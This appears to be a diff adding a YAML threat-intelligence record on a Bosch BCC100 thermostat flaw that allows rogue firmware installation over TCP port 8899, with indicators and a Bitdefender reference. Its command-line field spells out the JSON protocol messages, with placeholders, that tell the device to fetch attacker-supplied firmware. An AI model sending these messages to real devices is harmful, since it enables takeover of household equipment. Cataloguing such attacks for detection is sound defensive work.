@@ -1,0 +1,38 @@
+description: A vulnerability in the Bosch BCC100 thermostat (SW version 1.7.0, HD
+  Version 4.13.22) allows an attacker on the same network to replace the device firmware
+  with a rogue version via TCP port 8899.
+date: '2024-11-01'
+authors: Bitdefender Researchers
+attribution: Unknown
+TTPs:
+  processs: []
+  commandline:
+  - \\x81\\x46{"cmd":"device/update","device_id":"<device mac address>","timestamp":1111111}
+  - '{"cmd":"server/fireware","device_id":"<device mac address>","timestamp":"<unix
+    timestamp>","model":"BCC101","version":"1.7.0","id":"0"}'
+  - '{"error_code":"99","cmd":"server/fireware","device_id":"<device mac address>","timestamp":"<unix
+    timestamp>"}'
+  - \\x81\\x7e\\x01\\x33{"error_code":"0","cmd":"server/fireware","device_id":"<device
+    mac>","timestamp":"<unix timestamp>","model":"BCC101","version":"<fw version>","url":"<firmware
+    URL>","size":"<firmware size>","isize":"0","pic_pos":"2930","md5":"<firmware md5>","type":0,"release_date":"1111-11-11"}
+  - '{"cmd":"server/deviceUpdate","device_id":"<device mac>","timestamp":"<unix timestamp>","url":"<firmware
+    URL>","pindex":"0"}'
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  network_connections:
+  - port: '8899'
+    destination: localhost
+  file_modifications: []
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes: []
+  ips: []
+  domains:
+  - connect.boschconnectedcontrol.com
+  urls:
+  - <firmware URL>
+reference: https://www.bitdefender.com/en-us/blog/labs/vulnerabilities-identified-in-bosch-bcc100-thermostat
+file_creation_date: May 12, 2025
